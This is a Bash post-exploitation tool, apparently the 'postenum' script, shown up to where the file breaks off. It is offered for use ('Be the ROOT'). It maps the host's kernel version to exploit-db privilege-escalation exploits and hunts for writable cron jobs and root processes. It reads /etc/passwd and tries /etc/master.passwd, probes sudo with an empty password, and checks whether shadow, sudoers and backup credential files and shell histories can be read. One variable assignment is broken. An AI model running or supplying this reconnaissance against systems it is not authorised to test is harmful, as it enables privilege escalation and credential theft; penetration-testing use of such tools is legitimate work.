#!/bin/bash

# License: MIT

# Version 1.1

# Linux enumeration and privilege escalation tool.
# Be more than a normal user. Be the ROOT.

# variables
white=$'\e[0m'
blu=$'\e[0;94m'
cyan=$'\e[0;96m'
boldgrn=$'\e[1;92m'
yellowintensy=$'\e[0;93m'
grnintensy=$'\e[0;92m'
whiteboldintensy=$'\e[1;97m'
redintensy=$'\e[0;91m'

echo $whiteboldintensy"----------------------------------------------------------------------------"
echo "
                 _                             
 _ __   ___  ___| |_ ___ _ __  _   _ _ __ ___  
| '_ \ / _ \/ __| __/ _ \ '_ \| | | | '_ ' _ \ 
| |_) | (_) \__ \ ||  __/ | | | |_| | | | | | |  version : 1.1
| .__/ \___/|___/\__\___|_| |_|\__,_|_| |_| |_|
|_| 

"$white
echo "POST-EXPLOITATION Tool$grnintensy by Mostapha Bahadou"$white
echo $whiteboldintensy"----------------------------------------------------------------------------"$white
echo ""
echo " postenum - be the ROOT"
echo " For help or reporting issues, visit https://github.com/mostaphabahadou/postenum"
echo ""

function DirtyCow(){
	echo "$redintensy Linux Kernel 2.6.22 < 3.9 Dirty Cow$white - https://www.exploit-db.com/exploits/40839"
	echo "$redintensy Linux Kernel 2.6.22 < 3.9 Dirty Cow (x86-x64)$white - https://www.exploit-db.com/exploits/40616"
}

function Exploits1x(){
	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
}

function Exploits2x(){
	echo "$redintensy Linux Kernel 2.4.x/2.6.x$white - https://www.exploit-db.com/exploits/9545"
	echo "$redintensy UDEV < 1.4.1 (1)$white - https://www.exploit-db.com/exploits/8478"
	echo "$redintensy UDEV < 1.4.1 (2)$white - https://www.exploit-db.com/exploits/8572"
	echo "$redintensy UDEV < 1.4.1 (Metasploit)$white - https://www.exploit-db.com/exploits/21848"	
	echo "$redintensy Linux Kernel 2.6 < 2.6.19$white - https://www.exploit-db.com/exploits/9542"
	echo "$redintensy Linux Kernel 2.6.0 < 2.6.31(1)$white - https://www.exploit-db.com/exploits/33321"
	echo "$redintensy Linux Kernel 2.6.x (2)$white - https://www.exploit-db.com/exploits/33322"
	echo "$redintensy Linux Kernel 2.6.x$white - https://www.exploit-db.com/exploits/30604"
	echo "$redintensy Linux Kernel 2.6.39 < 3.2.2 Gentoo / Ubuntu x86-x64 Mempodipper(1)$white - https://www.exploit-db.com/exploits/18411"
	echo "$redintensy Linux Kernel 2.6.39 < 3.2.2 x86-x64 Mempodipper(2)$white - https://www.exploit-db.com/exploits/35161"
	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
}

function Exploits3x(){
	echo "$redintensy Linux Kernel 2.6.39 < 3.2.2 Gentoo / Ubuntu x86-x64 Mempodipper(1)$white - https://www.exploit-db.com/exploits/18411"
	echo "$redintensy Linux Kernel 2.6.39 < 3.2.2 x86-x64 Mempodipper(2)$white - https://www.exploit-db.com/exploits/35161"
	echo "$redintensy Linux Kernel 3.7.6 (RedHat x86/x64)$white - https://www.exploit-db.com/exploits/27297"
	echo "$redintensy Linux Kernel 3.13 < 3.19 Ubuntu 12.04/14.04/14.10/15.04$white - https://www.exploit-db.com/exploits/37292"
	echo "$redintensy Linux Kernel 3.13 SGID$white - https://www.exploit-db.com/exploits/33824"
	echo "$redintensy Linux Kernel 3.13.1 (Metasploit)$white - https://www.exploit-db.com/exploits/40503"
	echo "$redintensy Linux Kernel 3.14.5 (CentOS 7 / RHEL)$white - https://www.exploit-db.com/exploits/35370"
	echo "$redintensy Linux Kernel 3.x (Ubuntu 14.04/Mint 17.3/Fedora 22)$white https://www.exploit-db.com/exploits/41999"
	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
}

function Exploits4x(){
	echo "$redintensy Linux Kernel 4.3.3 Overlayfs$white - https://www.exploit-db.com/exploits/39230"
	echo "$redintensy Linux Kernel 4.3.3 (Ubuntu 14.04/15.10)$white - https://www.exploit-db.com/exploits/39166"
	echo "$redintensy Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64)$white - https://www.exploit-db.com/exploits/40871"
	echo "$redintensy Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x86-64)$white - https://www.exploit-db.com/exploits/47170"
	echo "$redintensy Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04)$white - https://www.exploit-db.com/exploits/43418"
	echo "$redintensy Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4)$white - https://www.exploit-db.com/exploits/44298"
	echo "$redintensy Linux Kernel 4.4.1$white - https://www.exploit-db.com/exploits/40003"
	echo "$redintensy Linux Kernel 4.8.0 (UDEV < 232) - https://www.exploit-db.com/exploits/41886"
	echo "$redintensy Linux kernel < 4.10.15 Race Condition$white - https://www.exploit-db.com/exploits/43345"
	echo "$redintensy Linux Kernel 4.13 (Debian 9)$white - https://www.exploit-db.com/exploits/44303"
	echo "$redintensy Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27)$white - https://www.exploit-db.com/exploits/45010"
	echo "$redintensy Linux Kernel 4.14.0-rc4+$white - https://www.exploit-db.com/exploits/43029"
	echo "$redintensy Linux Kernel 4.15.x < 4.19.2 (polkit Method)$white - https://www.exploit-db.com/exploits/47167"
	echo "$redintensy Linux Kernel 4.15.x < 4.19.2 (cron Method)$white - https://www.exploit-db.com/exploits/47164"
	echo "$redintensy Linux Kernel 4.10 < 5.1.17$white - https://www.exploit-db.com/exploits/47163"
}

function Exploits5x(){
	echo "$redintensy Linux Kernel 4.10 < 5.1.17$white - https://www.exploit-db.com/exploits/47163"
	echo "$redintensy Linux 5.3$white - https://www.exploit-db.com/exploits/47779"
}

function OperatingSystem(){
	echo $boldgrn"[-] OPERATING SYSTEM"$white
	echo $cyan"[+] - Check current user and group information:"$white
	echo $yellowintensy"[x] The current user and group information:"$white
	ID=$(id 2>/dev/null)
	if [ "$ID" ];
	then
		echo -e "$ID\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'id' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] The current user:"$white
	WHOAMI=$(whoami 2>/dev/null)
	if [ "$WHOAMI" ];
	then
		echo -e "$WHOAMI\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'whoami' not found or empty output!\n"
	fi

	echo $cyan"[+] - Check distribution type and version number:"$white
	echo $yellowintensy"[x] The distribution type and version:"$white
	RELEASE=$(cat /etc/*-release 2>/dev/null)
	if [ "$RELEASE" ];
	then
		echo -e "$RELEASE\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi 

	echo $cyan"[+] - CPU information:"$white
	echo $yellowintensy"[x] CPU architecture information from sysfs and /proc/cpuinfo:"$white
	CPUINFO=$(lscpu 2>/dev/null)
	if [ "$CPUINFO" ];
	then
		echo -e "$CPUINFO\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'lscpu' not found or empty output!\n"
	fi
		
	echo $cyan"[+] - Check kernel version:"$white
	echo $yellowintensy"[x] Kernel version and (32-bit/64-bit):"$white
	UNAME=$(uname -a 2>/dev/null)
	if [ "$UNAME" ];
	then
		echo -e "$UNAME\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'uname' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Kernel version and gcc version used to compile the kernel:"$white
	PROCVERSION=$(cat /proc/version 2>/dev/null)
	if [ "$PROCVERSION" ];
	then
		echo -e "$PROCVERSION\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $cyan"[+] - Exploits:"$white
	underversion2=2.0.0
	kernel=$(uname -a | cut -d " " -f "3" | cut -d "-" -f "1")
	OPERATOR=$(echo "$kernel $underversion2" | awk '{if ($1 < $2) print "2"; else print "3"}')
	if [ "$OPERATOR" == "2" ];
	then
		echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
		echo "Popular 'possible not sure' exploits for kernel $kernel"
		echo "-----------------------------------------------------------"
		Exploits1x
		echo -e "\nThe most specific exploits for your kernel $kernel"
		echo "-----------------------------------------------------------"
		Exploits1x > exploits1.txt
		minimumsize=42
		actualsize=$(wc -c exploits1.txt|cut -d " " -f 1)
		if [ "$actualsize" -ge "$minimumsize" ];
		then
			grep "$kernel" exploits1.txt > exploit.txt
			shred -n 5 -u -z exploits1.txt
			exploitfilesize=$(wc -c exploit.txt|cut -d " " -f 1)
			if [ "$exploitfilesize" -ge "$minimumsize" ];
			then
				cat exploit.txt
				shred -n 5 -u -z exploit.txt
			else
				echo "No accurate exploit, for kernel $kernel - use google search!"
			fi
		else
			echo "Nothing here! But don't give up."
		fi
	else
		underversion3=3.0.0
		OPERATOR=$(echo "$kernel $underversion3" | awk '{if ($1 < $2) print "3"; else print "4"}')
		if [ "$OPERATOR" == "3" ];
		then
			echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
			echo "Popular 'possible not sure' exploits for kernel $kernel"
			echo "-----------------------------------------------------------"
			Exploits3x
			DirtyCow
			echo -e "\nThe most specific exploits for your kernel $kernel"
			echo "-----------------------------------------------------------"
			Exploits3x > exploits2.txt
			DirtyCow >> exploits2.txt
			minimumsize=42
			actualsize=$(wc -c exploits2.txt|cut -d " " -f 1)
			if [ "$actualsize" -ge "$minimumsize" ];
			then
				grep "$kernel" exploits2.txt > exploit.txt
				shred -n 5 -u -z exploits2.txt
				exploitfilesize=$(wc -c exploit.txt|cut -d " " -f 1)
				if [ "$exploitfilesize" -ge "$minimumsize" ];
				then
					cat exploit.txt
					shred -n 5 -u -z exploit.txt
				else
					echo "No accurate exploit, for kernel $kernel - use google search!"
				fi
			else
				echo "Nothing here! But don't give up."
			fi
		else
			underversion4=4.0.0
			OPERATOR=$(echo "$kernel $underversion4" | awk '{if ($1 < $2) print "4"; else print "5"}')
			if [ "$OPERATOR" == "4" ];
			then
				echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
				echo "Popular 'possible not 100% sure' exploits for kernel $kernel"
				echo "-----------------------------------------------------------"
				Exploits3x
				DirtyCow
				echo -e "\nThe most specific exploits for your kernel $kernel"
				echo "-----------------------------------------------------------"
				Exploits3x > exploits3.txt
				DirtyCow >> exploits3.txt
				minimumsize=42
				actualsize=$(wc -c exploits3.txt|cut -d " " -f 1)
				if [ "$actualsize" -ge "$minimumsize" ];
				then
					grep "$kernel" exploits3.txt > exploit.txt
					shred -n 5 -u -z exploits3.txt
					exploitfilesize=$(wc -c exploit.txt|cut -d " " -f 1)
					if [ "$exploitfilesize" -ge "$minimumsize" ];
					then
						cat exploit.txt
						shred -n 5 -u -z exploit.txt
					else
						echo "No accurate exploit, for kernel $kernel - use google search!"
					fi
				else
					echo "Nothing here! But don't give up."
				fi
			else
				underversion5=5.0.0
				OPERATOR=$(echo "$kernel $underversion5" | awk '{if ($1 < $2) print "5"; else print "6"}')
				if [ "$OPERATOR" == "5" ];
				then
					echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
					echo "Popular 'possible not sure' exploits for kernel $kernel"
					echo "-----------------------------------------------------------"
					Exploits4x
					echo -e "\nThe most specific exploits for your kernel $kernel"
					echo "-----------------------------------------------------------"
					Exploits4x > exploits4.txt
					minimumsize=42
					actualsize=$(wc -c exploits4.txt|cut -d " " -f 1)
					if [ "$actualsize" -ge "$minimumsize" ];
					then
						grep "$kernel" exploits4.txt > exploit.txt
						shred -n 5 -u -z exploits4.txt
						exploitfilesize=$(wc -c exploit.txt|cut -d " " -f 1)
						if [ "$exploitfilesize" -ge "$minimumsize" ];
						then
							cat exploit.txt
							shred -n 5 -u -z exploit.txt
						else
							echo "No accurate exploit, for kernel $kernel - use google search!"
						fi
					else
						echo "Nothing here! But don't give up."
					fi
				else
					underversion6=6.0.0
					OPERATOR=$(echo "$kernel $underversion6" | awk '{if ($1 < $2) print "6"; else print "7"}')
					if [ "$OPERATOR" == "6" ];
					then
						echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
						echo "Popular 'possible not sure' exploits for kernel $kernel"
						echo "-----------------------------------------------------------"
						Exploits5x
						echo -e "\nThe most specific exploits for your kernel $kernel"
						echo "-----------------------------------------------------------"
						Exploits5x > exploits5.txt
						minimumsize=42
						actualsize=$(wc -c exploits5.txt|cut -d " " -f 1)
						if [ "$actualsize" -ge "$minimumsize" ];
						then
							grep "$kernel" exploits5.txt > exploit.txt
							shred -n 5 -u -z exploits5.txt
							exploitfilesize=$(wc -c exploit.txt|cut -d " " -f 1)
							if [ "$exploitfilesize" -ge "$minimumsize" ];
							then
								cat exploit.txt
								shred -n 5 -u -z exploit.txt
							else
								echo "No accurate exploit, for kernel $kernel - use google search!"
							fi
						else
							echo "Nothing here! But don't give up."
						fi
					else
						echo $yellowintensy"[x] Possible exploits for linux kernel $kernel:"$white
						echo $redintensy"Nothing in our database on kernel $kernel. You still need to check using google search."$white
					fi
				fi
			fi
		fi
	fi
	echo ""
}

function AppsAndServices(){
	echo $boldgrn"[-] APPS and SERVICES"$white
	echo $cyan"[+] - Check jobs scheduled:"$white
	echo $yellowintensy"[x] Search on cron in /etc:"$white
	CRON=$(for x in "/etc"; do ls -l "$x"; done | grep cron 2>/dev/null)
	if [ "$CRON" ];
	then
		echo -e "$CRON\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the '*cron* path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Custom jobs or tasks configured as root and are world-writeable:"$white
	CRONWRASROOT=$(find /etc/cron* -type f -perm -o+w -exec ls -l {} \; 2>/dev/null)
	if [ "$CRONWRASROOT" ];
	then
		
		echo -e $redintensy"$CRONWRASROOT\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] List /etc/cron.d/:"$white
	CROND=$(for x in "/etc/cron.d/"; do ls -l "$x"; done | grep -v "total " 2>/dev/null)
	if [ "$CROND"  ];
	then
		echo -e "$CROND\n"
		echo $yellowintensy"[x] Root's cron jobs:"$white
		crontab -l
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
		echo $yellowintensy"[x] Root's cron jobs:"$white
		crontab -l
	fi
	echo ""

	echo $yellowintensy"[x] The content of /etc/crontab:"$white
	CRONTAB=$(cat /etc/crontab 2>/dev/null)
	if [ "$CRONTAB"  ];
	then
		echo -e "$CRONTAB\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] View daily cron jobs:"$white
	CRONDAILY=$(for x in "/etc/cron.daily"; do ls -l "$x"; done | grep -v "total " 2>/dev/null)
	if [ "$CRONDAILY" ];
	then
		echo -e "$CRONDAILY\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] View hourly cron jobs:"$white
	CRONDHOURLY=$(for x in "/etc/cron.hourly"; do ls -l "$x"; done | grep -v "total " 2>/dev/null)
	if [ "$CRONDHOURLY" ];
	then
		echo -e "$CRONDHOURLY\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi 

	echo $yellowintensy"[x] View monthly cron jobs:"$white
	CRONDMONTHLY=$(for x in "/etc/cron.monthly"; do ls -l "$x"; done | grep -v "total " 2>/dev/null)
	if [ "$CRONDMONTHLY" ];
	then
		echo -e "$CRONDMONTHLY\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi 

	echo $yellowintensy"[x] View weekly cron jobs:"$white
	CRONDWEEKLY=$(for x in "/etc/cron.weekly"; do ls -l "$x"; done | grep -v "total " 2>/dev/null)
	if [ "$CRONDWEEKLY" ];
	then
		echo -e "$CRONDWEEKLY\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi 

	echo $yellowintensy"[x] Find world-writeable cron jobs:"$white
	WRITEABLECRONJOB=$(find /etc/cron* -type f -perm -o+w -exec ls -l {} \;)
	if [ "$WRITEABLECRONJOB" ];
	then
		echo -e "$WRITEABLECRONJOB\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi 

	echo $cyan"[+] - Check for running services, and which service(s) are been running by root:"$white
	echo $yellowintensy"[x] Display every process on the system:"$white
	AUX=$(ps aux 2>/dev/null)
	if [ "$AUX" ];
	then
		echo -e "$AUX\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'ps' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Process binaries and permissions:"$white
	PROCESSBINARY=$(ps aux | awk '{print $11}'| xargs -r ls -la 2>/dev/null | awk '!x[$0]++' 2>/dev/null)
	if [ "$PROCESSBINARY" ];
	then
  		echo -e "$PROCESSBINARY\n"
  	else
  		echo -e "None -> Probably needs more privileges(sudo), the command 'ps,xargs,awk' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Display every process running by root on the system:"$white
	AUXROOT=$(ps aux | grep root 2>/dev/null)
	if [ "$AUXROOT" ];
	then
		echo -e "$AUXROOT\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'ps' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Is mysql running by root:"$white
	MYSQL=$(ps aux | grep mysql 2>/dev/null)
	if [ "$MYSQL" ];
	then
		echo -e $redintensy"$MYSQL\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'ps' not found or empty output!\n"
	fi
}

function CommAndNet(){
	echo $boldgrn"[-] COMMUNICATING and NETWORKING"$white
	echo $cyan"[+] - Check NIC(s) does the system have:"$white
	echo $yellowintensy"[x] Display all interfaces which are currently available:"$white
	IFCONFIG=$(ifconfig -a 2>/dev/null)
	if [ "$IFCONFIG" ];
	then
		echo -e "$IFCONFIG\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'ifconfig' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Available network interfaces on the system:"$white
	INTERFACE=$(cat /etc/network/interfaces 2>/dev/null)
	if [ "$INTERFACE" ];
	then
		echo -e "$INTERFACE\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Hosts:"$white
	HOST=$(cat /etc/hosts 2>/dev/null)
	if [ "$HOST" ];
	then
		echo -e "$HOST\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $cyan"[+] - Check network configuration settings:"$white
	echo $yellowintensy"[x] DNS name servers:"$white
	RESOLV=$(cat /etc/resolv.conf 2>/dev/null)
	if [ "$RESOLV" ];
	then
		echo -e "$RESOLV\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Networks:"$white
	NETWORK=$(cat /etc/networks 2>/dev/null)
	if [ "$NETWORK" ];
	then
		echo -e "$NETWORK\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] SELinux enabled - status:"$white
	SELinux=$(sestatus 2>/dev/null)
	if [ "$SELinux" ];
	then
		echo -e "$SELinux\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'sestatus' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Packet filter rules:"$white
	IPTABLE=$(iptables -L 2>/dev/null)
	if [ "$IPTABLE" ];
	then
		echo -e "$IPTABLE\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'iptables' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] hostname:"$white
	HOSTNAME=$(hostname 2>/dev/null)
	if [ "$HOSTNAME" ];
	then
		echo -e "$HOSTNAME\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'hostname' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Get DNS domain or the FQDN:"$white
	DNS=$(dnsdomainname 2>/dev/null)
	if [ "$DNS" ];
	then
		echo -e "$DNS\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'dnsdomainname' not found or empty output!\n"
	fi

	echo $cyan"[+] - Check users and hosts communicating with the system:"$white
	echo $yellowintensy"[x] Display all TCP/UDP connected socket, PID/program:"$white
	NETSTAT=$(netstat -antup 2>/dev/null)
	if [ "$NETSTAT" ];
	then
		echo -e "$NETSTAT\n"
	else
		#alternative to netstat
		SS=$(ss -tuln 2>/dev/null)
		echo -e "$SS\n"
	fi

	echo $yellowintensy"[x] List files based on their Internet address:"$white
	LSOF=$(lsof -Pi 2>/dev/null)
	if [ "$LSOF" ];
	then
		echo -e "$LSOF\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'lsof' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Last logged on users:"$white
	LAST=$(last -a 2>/dev/null)
	if [ "$LAST" ];
	then
		echo -e "$LAST\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'last' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Most Recent Logins:"$white
	LASTLOG=$(lastlog 2>/dev/null)
	if [ "$LASTLOG" ];
	then
		echo -e "$LASTLOG\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'lastlog' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Who is currently logged onto the system:"$white
	W=$(w 2>/dev/null)
	if [ "$W" ];
	then
		echo -e "$W\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'w' not found or empty output!\n"
	fi

	echo $cyan"[+] - Check cached IP and/or MAC addresses:"$white
	echo $yellowintensy"[x] Display all hosts based on ARP:"$white
	ARP=$(arp -a 2>/dev/null)
	if [ "$ARP" ];
	then
		echo -e "$ARP\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'arp' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Display IP routing table:"$white
	ROUTE=$(route -nee 2>/dev/null)
	if [ "$ROUTE" ];
	then
		echo -e "$ROUTE\n" 
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'route' not found or empty output!\n"
	fi
}

function ConfidentialInfoAndUser(){
	echo $boldgrn"[-] CONFIDENTIAL INFO and USER"$white
	echo $cyan"[+] - Check list of users and super users:"$white
	SUPERUSER1=$(awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null)
	SUPERUSER2=$(grep -v -E "^#" /etc/passwd 2>/dev/null | awk -F: '$3 ==0 { print $1}' 2>/dev/null)
	if [ "$SUPERUSER1" ] || [ "$SUPERUSER2" ];
	then
		echo $yellowintensy"[x] Super user:"$white
		echo "$SUPERUSER1"; echo "$SUPERUSER2"
		echo ""
	else
		:
	fi

	echo $yellowintensy"[x] Useful home users:"$white
	HOMEUSERS=$(ls -ld /home/* 2>/dev/null)
	if [ "$HOMEUSERS" ];
	then
		echo -e $redintensy"$HOMEUSERS\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] From /etc/passwd - /bin/bash /bin/sh /bin/dash:"$white
	PASSWD=$(cat /etc/passwd | grep "/bin/bash\|/bin/sh\|/bin/dash" 2>/dev/null)
	if [ "$PASSWD" ];
	then
		echo -e "$PASSWD\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or empty output!\n"
	fi

	echo $cyan"[+] - Check /etc for config files (recursive 1 level):"$white
	echo $yellowintensy"[x] All *.conf files in /etc (recursive 1 level):"$white
	CHECKETC=$(find /etc/ -maxdepth 1 -name "*.conf" -type f -exec ls -la {} \; 2>/dev/null)
	if [ "$CHECKETC" ];
	then
		echo -e "$CHECKETC\n"
	else
		echo -e "None -> Probably needs more privileges(sudo), the command 'find' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] Check to see if we can read master.passwd:"$white
	MASTERPASS=$(cat /etc/master.passwd 2>/dev/null)
	if [ "$MASTERPASS" ];
	then
		echo $redintensy"[/] Readable - /etc/master.passwd"$white
		echo -e "$MASTERPASS\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'path' not found!\n"
	fi

	echo $yellowintensy"[x] Sudo permissions"$white
	SUDOPASS=$(echo '' | sudo -S -l 2>/dev/null)
	if [ "$SUDOPASS" ];
	then
		echo $redintensy"[/] We can run sudo without supplying a password:"$white
		echo -e "$SUDOPASS\n"
	else
		echo -e "None -> Probably needs more privileges(sudo)!\n"
	fi

	echo $cyan"[+] - Check sensitive files:"$white
	echo $yellowintensy"[x] From /etc - /etc/passwd /etc/shadow /etc/group /etc/sudoers:"$white
	WRPASS=$(ls -l /etc/passwd 2>/dev/null)
	if [ -w /etc/passwd ];
	then
		echo $redintensy"$WRPASS"$white
	else
		echo "$WRPASS"
	fi

	WXSHADOW=$(ls -l /etc/shadow 2>/dev/null)
	if [ -w /etc/shadow ] || [ -r /etc/shadow ];
	then
		echo $redintensy"$WXSHADOW"$white
	else
		echo "$WXSHADOW"
	fi

	WRGROUP=$(ls -l /etc/group 2>/dev/null)
	if [ -w /etc/group ]; 
	then
		echo $redintensy"$WRGROUP"$white
	else
		echo "$WRGROUP"
	fi

	WRSUDOERS=$(ls -l /etc/sudoers 2>/dev/null)
	if [ -w /etc/sudoers ] || [ -r /etc/sudoers ];
	then
		echo $redintensy"$WRSUDOERS"$white
	else
		echo "$WRSUDOERS"
	fi
	echo ""

	if [ -r /var/backups/passwd.bak ] || [ -r /var/backups/group.bak ] || [ -r /var/backups/shadow.bak ] || [ -r /var/backups/gshadow.bak ];
	then
		echo $cyan"[+] - Check backup files:"$white
		BACKUPPASS=$(ls -l /var/backups/passwd.bak 2>/dev/null)
		if [ -r /var/backups/passwd.bak ];
		then
			echo $redintensy"$BACKUPPASS"$white
		else
			echo "$BACKUPPASS"
		fi

		BACKUPGROUP=$(ls -l /var/backups/group.bak 2>/dev/null)
		if [ -r /var/backups/group.bak  ];
		then
			echo $redintensy"$BACKUPGROUP"$white
		else
			echo "$BACKUPGROUP"
		fi

		BACKUPSHADOW=$(ls -l /var/backups/shadow.bak 2>/dev/null)
		if [ -r /var/backups/shadow.bak ];
		then
			echo $redintensy"$BACKUPSHADOW"$white
		else
			echo "$BACKUPSHADOW"
		fi

		BACKUPGSHADOW=$(ls -l /var/backups/gshadow.bak 2>/dev/null)
		if [ -r /var/backups/gshadow.bak ];
		then
			echo $redintensy"$BACKUPGSHADOW"$white
		else
			echo "$BACKUPGSHADOW"
		fi
	else
		echo $cyan"[+] - Check backup files - /var/backups/:"$white
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] From / - any interesting folder/files:"$white
	UNUSUALF=$(ls -la / | grep -v 'total ' 2>/dev/null)
	if [ "$UNUSUALF" ];
	then
		echo -e "$UNUSUALF\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $cyan"[+] - Check if anything interesting in the mail directory:"$white
	echo $yellowintensy"[x] Interesting mail in /var/mail:"$white
	if [ -d /var/mail ];
	then 
		MAILVAR=$(for x in "/var/mail"; do ls -lh "$x"; done | grep -v "total " 2>/dev/null)
		if [ "$MAILVAR" ];
		then
			echo -e "$MAILVAR\n"
		else
			echo -e "None -> Probably needs more privileges(sudo) or empty output!\n"
		fi
	else
		echo -e "None -> Probably needs more privileges(sudo) or the 'path' not found!\n"
	fi

	echo $yellowintensy"[x] Is /var/mail/root exist - you can try to read it:"$white
	if [ -e /var/mail/root ];
	then
		$ROOTMAIL=$(ls -l /var/mail/root | grep -v "total " 2>/dev/null)
		echo -e $redintensy"$ROOTMAIL"$white
	else
		echo -e "None -> Probably needs more privileges(sudo), the 'path' not found or empty output!\n"
	fi

	echo $cyan"[+] - Check if anything interesting in the home/root directories:"$white
	echo $yellowintensy"[x] Check if /root is accessible:"$white
	ROOTDIR=$(for x in "/root"; do ls -lh "$x"; done 2>/dev/null)
	if [ "$ROOTDIR" ];
	then
		echo $redintensy"[/] Root directory can be accessible"$white
		echo -e "$ROOTDIR\n"
	else
		echo -e "None -> Probably needs more privileges(sudo) or empty output!\n"
	fi

	echo $yellowintensy"[x] Interesting /home/* directory:"$white
	HOMEDIR=$(for x in "/home"; do ls -lh "$x"; done 2>/dev/null)
	if [ "$HOMEDIR" ];
	then
		echo -e $redintensy"$HOMEDIR\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo) or empty output!\n"
	fi

	echo $yellowintensy"[x] History files of /home/*/:"$white
	HOMEHISTORY=$(find /home/* -name *.*history* -print 2> /dev/null)
	if [ "$HOMEHISTORY" ];
	then
		echo -e $redintensy"$HOMEHISTORY\n"$white
	else
		echo -e "None -> Probably needs more privileges(sudo) the 'path' not found or empty output!\n"
	fi

	echo $yellowintensy"[x] History files of /root:"$white
	ROOTHISTORY=$(for x in /root/.*_history; do ls -lh "$x"; done 2>/dev/null)
	if [ "$ROOTHISTORY" ];
	then
